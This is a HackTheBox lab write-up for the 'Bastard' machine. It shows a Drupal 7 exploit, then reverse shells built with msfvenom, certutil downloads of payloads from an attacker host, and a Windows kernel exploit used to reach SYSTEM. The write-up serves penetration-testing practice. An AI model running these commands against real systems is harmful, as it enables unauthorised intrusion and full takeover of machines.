---
title: "Bastard HackTheBox" 
date: 2025-07-03 06:00:00 0000+
tags: [WriteUp, Bastard, HTB, Enumeration, CMS, CVE, Drupal, Kernal Exploit, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Bastard_HTB/preview_bastard.png
---
# Bastard HTB Writeup

Bastard is a medium level windows machine on HTB which focuses mainly on exploitation of CMS's (content management systems) in this case drupal version 7.54 is vulnerable, which helps us gain a initial shell which is our first foothold. Revealing kernel version gives away another CVE which helps in privesc to system.

![image.png](/assets/images/Bastard_HTB/image.png)

## Initial Enumeration

As always we are gonna start off with the rustnmap to find open ports and services running on the box.

```bash
rustmap.py -ip 10.129.149.217
```

![image.png](/assets/images/Bastard_HTB/image%201.png)

Nmap results identified the Drupal version is 7.

## Exploitation

Visiting the webpage at port 80.

![image.png](/assets/images/Bastard_HTB/image%202.png)

I tried doing some common password attacks on the login page but they were unsuccessful.

Finally gave up and decided to search exploits with drupal 7.

Found!! a really interesting php script.

![image.png](/assets/images/Bastard_HTB/image%203.png)

I mirrored the script to my current directory.

```bash
searchsploit -m php/webapps/41564.php
```

Made some changes to the file and decided to execute my payload.

![image.png](/assets/images/Bastard_HTB/image%204.png)

In the data field I added a simple php cmd shell to execute commands on the webpage

To run this php exploit I install php-curl using

```bash
apt install php-curl
```

and then executed it.

![image.png](/assets/images/Bastard_HTB/image%205.png)

Visiting the URL for our exploit to work.

![image.png](/assets/images/Bastard_HTB/image%206.png)

We are **iusr** user on the box.

 

### Shell as iusr

Now I first created a reverse shell exe file using msfvenom.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.46 LPORT=9001 -f exe > shell.exe
```

![image.png](/assets/images/Bastard_HTB/image%207.png)

Then started a python server to serve this shell.exe file 

```bash
python3 -m http.server 9090
```

![image.png](/assets/images/Bastard_HTB/image%208.png)

Now using **Certutil** to download our shell.exe on the box.

```bash
certutil -urlcache -split -f "http://10.10.14.46:9090/shell.exe"
```

I executed the above command on the webserver using our uploaded payload.

![image.png](/assets/images/Bastard_HTB/image%209.png)

We can also see the hits on our python web server.

![image.png](/assets/images/Bastard_HTB/image%2010.png)

Now we listen on our attacker machine using **nc** and attempt to run shell.exe our reverse shell. 

Lets see we get a hitback on our attack machine.

```bash
nc -lnvp 9001 # on attacker machine
```

![image.png](/assets/images/Bastard_HTB/image%2011.png)

![image.png](/assets/images/Bastard_HTB/image%2012.png)

We get a successful hit back on our attacker machine.

Further enumeration reveals that we have read access to the user.txt file.

So grabbing the user.txt file in dimitris desktop.

![image.png](/assets/images/Bastard_HTB/image%2013.png)

## Privilege Escalation

Now for the privesc part I enumerated more and since this is an old machine I looked for the kernel version.

![image.png](/assets/images/Bastard_HTB/image%2014.png)

We can see that there are none hotfixes applied to it and it is running the windows server 2008 R2 datacenter.

I googled this and found this exploit on github

<https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri/Compiled>

![image.png](/assets/images/Bastard_HTB/image%2015.png)

Using **Certutil** to upload it to the box, also started a python server to serve this binary.

```bash
certutil -urlcache -split -f "http://10.10.14.46:9090/privesc.exe"
```

![image.png](/assets/images/Bastard_HTB/image%2016.png)

![image.png](/assets/images/Bastard_HTB/image%2017.png)

Successfully downloaded the executable on the remote machine.

Now started a netcat reverse shell on port 9002 and executed our reverse shell.

```powershell
nc -lnvp 9002 # on attacker machine
.\privesc.exe 10.10.14.46 9002
```

![image.png](/assets/images/Bastard_HTB/image%2018.png)

We get a hit back and finally we are NT AUTHORITY\SYSTEM on the box.

Now grabbing the root.txt

![image.png](/assets/images/Bastard_HTB/image%2019.png)

![image.png](/assets/images/Bastard_HTB/image%2020.png)

Rooted!!

Thanks for reading 😄
